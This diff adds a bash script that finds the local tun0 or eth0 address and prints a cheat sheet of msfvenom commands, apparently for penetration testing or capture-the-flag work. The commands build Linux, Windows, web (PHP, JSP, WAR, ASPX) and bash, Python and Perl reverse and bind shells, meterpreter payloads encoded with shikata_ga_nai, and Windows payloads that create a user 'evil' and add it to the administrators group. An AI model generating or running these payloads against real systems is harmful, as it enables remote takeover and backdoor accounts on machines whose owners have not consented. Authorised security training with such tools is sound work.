@@ -1,0 +1,45 @@
+#!/bin/bash
+
+# display msfvenom commands 
+
+Frame='\033[0;32m'   # Green
+Link='\033[0;35m'  	 # Purple
+Title='\033[1;33m' 	 # Bold Yellow
+Comment='\033[0;36m' # Cyan
+End='\033[0m'		 # No Color
+Point='\033[0;31m[*]\033[0m'
+
+ip=$(/sbin/ip -o -4 addr list tun0 | awk '{print $4}' | cut -d/ -f1) 2>/dev/null
+if [ "$ip" == "" ]; then
+	ip=$(/sbin/ip -o -4 addr list eth0 | awk '{print $4}' | cut -d/ -f1)
+fi
+
+echo -e "${Frame}###${End} ${Title}Linux${End} ${Frame}###${End}"
+echo -e "${Point} msfvenom -p linux/x86/exec CMD=/bin/bash -f elf -o bash.elf ${Comment}# exec cmd${End}"
+echo -e "${Point} msfvenom -p linux/x86/shell_reverse_tcp LHOST=$ip LPORT=443 -f elf -o reverse.elf"
+echo -e "${Point} msfvenom -p linux/x86/meterpreter/bind_tcp LHOST=$ip LPORT=4444 -f elf -o bind.elf ${Comment}# bind shell${End}"
+echo -e ""
+
+
+echo -e "${Frame}###${End} ${Title}Windows${End} ${Frame}###${End}"
+echo -e "${Point} msfvenom -p windows/adduser USER=evil PASS=evil -f exe -o adduser.exe"
+echo -e "${Point} msfvenom -p windows/shell_reverse_tcp LHOST=$ip LPORT=443 -e x86/shikata_ga_nai -f exe -o reverse.exe"
+echo -e "${Point} msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=4444 -e x86/shikata_ga_nai -f exe -o meterpreter.exe ${Comment}# encoder${End}"
+echo -e "${Point} msfvenom -p windows/meterpreter/bind_tcp LHOST=$ip LPORT=4444 -f exe -o bind.exe ${Comment}# bind shell${End}"
+echo -e "${Point} msfvenom -a x86 --platform Windows -p windows/exec CMD=\"net localgroup administrators evil /add\" -f exe -o cmd.exe ${Comment}# exec cmd${End}"
+echo -e ""
+
+
+echo -e "${Frame}###${End} ${Title}Web Based${End} ${Frame}###${End}"
+echo -e "${Point} msfvenom -p php/reverse_php LHOST=$ip LPORT=443 -f raw -o reverse.php ${Comment}# php${End}"
+echo -e "${Point} msfvenom -p java/jsp_shell_reverse_tcp LHOST=$ip LPORT=443 -f raw -o reverse.jsp ${Comment}# jsp${End}"
+echo -e "${Point} msfvenom -p java/jsp_shell_reverse_tcp LHOST=$ip LPORT=443 -f war -o reverse.war ${Comment}# war jsp${End}"
+echo -e "${Point} msfvenom -p windows/shell_reverse_tcp LHOST=$ip LPORT=443 -f aspx -o reverse.aspx ${Comment}# asp/aspx${End}"
+echo -e ""
+
+
+echo -e "${Frame}###${End} ${Title}Script Language payloads${End} ${Frame}###${End}"
+echo -e "${Point} msfvenom -p cmd/unix/reverse_bash LHOST=$ip LPORT=443 -f raw -o reverse.sh ${Comment}# bash${End}"
+echo -e "${Point} msfvenom -p cmd/unix/reverse_python LHOST=$ip LPORT=443 -f raw -o reverse.py ${Comment}# python${End}"
+echo -e "${Point} msfvenom -p cmd/unix/reverse_perl LHOST=$ip LPORT=443 -f raw -o reverse.pl ${Comment}# perl${End}"
+
